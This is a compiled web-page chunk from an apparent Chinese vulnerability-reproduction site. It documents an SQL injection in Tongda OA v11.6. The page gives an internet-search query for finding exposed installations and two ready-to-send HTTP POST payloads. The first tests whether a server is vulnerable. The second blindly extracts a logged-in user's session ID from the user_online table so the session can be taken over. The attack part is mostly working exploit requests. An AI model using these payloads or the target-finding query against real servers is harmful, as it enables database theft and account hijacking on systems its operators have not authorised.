(window.webpackJsonp=window.webpackJsonp||[]).push([[402],{1769:function(t,s,a){t.exports=a.p+"assets/img/1628303165911-5ee90d8c-903a-46d7-a373-ab9b04bdb173.8a55104c.png"},1770:function(t,s,a){t.exports=a.p+"assets/img/1628303346227-1737a449-b413-4475-83b3-0190c946fa7c.d88983aa.png"},3028:function(t,s,a){"use strict";a.r(s);var n=a(64),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"通达oa-v11-6-insert-sql注入漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-6-insert-sql注入漏洞"}},[t._v("#")]),t._v(" 通达OA v11.6 insert SQL注入漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("通达OA v11.6 ")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('app="TDXK-通达OA" ')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登陆页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1769),alt:"img"}})]),t._v(" "),s("p",[t._v("发送请求包判断漏洞")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("general"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("document"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("recv"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("register"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("insert "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nUser"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("77")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("www"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("form"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("urlencoded\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\ntitle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("values")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\'"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ascii")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("MOD")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("128")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("710")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =1&_SERVER=")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br")])]),s("p",[t._v("返回302则是存在漏洞，返回500则不存在")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1770),alt:"img"}})]),t._v(" "),s("p",[t._v("确认存在漏洞后，再通过SQL注入获取 SessionID进一步攻击")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("general"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("document"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("recv"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("register"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("insert "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nUser"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("122")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("www"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("form"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("urlencoded\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\ntitle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("values")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\'"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exp")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ascii")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SID")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("from"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("user_online"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("limit"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("710")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =1&_SERVER=")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br")])])],1)}),[],!1,null,null,null);s.default=r.exports}}]);